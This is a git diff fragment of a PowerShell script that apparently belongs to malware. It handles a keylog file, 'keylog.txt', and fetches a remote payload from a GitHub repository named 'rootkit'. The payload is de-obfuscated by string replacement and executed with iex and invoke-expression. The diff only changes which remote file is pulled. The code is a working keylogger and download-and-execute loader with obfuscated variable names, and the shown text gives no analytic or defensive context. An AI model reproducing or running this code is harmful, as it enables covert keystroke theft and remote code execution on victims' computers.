@@ -29,7 +29,7 @@ Start-Process powershell -ArgumentList "-Command", {
         }
         GetFile $logFilePath "keylog.txt"
         if($elapsedTime -eq 0) {
-            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/temp.txt')};
+            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/main')};
             $qweewqq=$nbvccxx.Replace('wererfvx','');
             $zxdsxxxxc=iex $qweewqq;
             invoke-expression $zxdsxxxxc
